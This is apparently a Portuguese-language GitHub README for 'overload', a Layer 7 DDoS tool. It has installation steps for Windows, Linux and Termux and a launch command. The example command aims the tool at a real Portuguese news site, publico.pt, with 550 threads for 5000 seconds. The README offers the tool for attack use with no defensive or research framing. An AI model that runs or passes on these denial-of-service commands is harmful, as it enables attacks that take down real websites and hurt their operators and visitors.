<h1 align="center">📡 DDOS Tool (Layer 7) </h1> 
<p align="center">
  <img src="https://raw.githubusercontent.com/7zx/overload/main/img/logo.png" width="200" height="200">
</p>

# :computer: Janela Principal
<p align="center">
  <img src="https://raw.githubusercontent.com/tanjilk/overload/main/img/imgshow.png">
</p>

# 🌙 Instalação


<h2>Windows</h2> <img src="https://cdn.iconscout.com/icon/free/png-256/windows-221-1175066.png" width="50" height="50">  

  - Instala Python 3.8 [aqui](https://www.python.org/downloads/release/python-38)
  - Abre o installer e clica em: `add python to PATH`
  - Faz download do overload <a href="https://github.com/7zx/overload/archive/refs/heads/main.zip" target="blank">aqui</a>
  - Abre o cmd ou o PowerShell no diretório overload
  - Execute este comando: `pip install -r requirements.txt`  


 

 <h2>Linux</h2><img src="https://raw.githubusercontent.com/8fn/overload/main/img/linux-icon-28166.png" width="50" height="50">

```
sudo apt update
sudo apt install python3 python3-pip git -y
git clone https://github.com/7zx/overload
cd overload/
pip3 install -r requirements.txt
```

<h2>Termux</h2><img src="https://brandslogos.com/wp-content/uploads/images/large/terminal-logo.png" width="50" height="50">
```
pkg update
pkg install python3 python3-pip git -y
git clone https://github.com/7zx/overload
cd overload/
pip3 install -r requirements.txt
```

## ❓ Como Usar
O comando básico para poder executar o overload é o seguinte.  

```
python3 overload.py --time XXX --threads XXX --target [URL] --method HTTP
```

Exemplo:  

```
python3 overload.py --time 5000 --threads 550 --target https://www.publico.pt/ --method HTTP
```
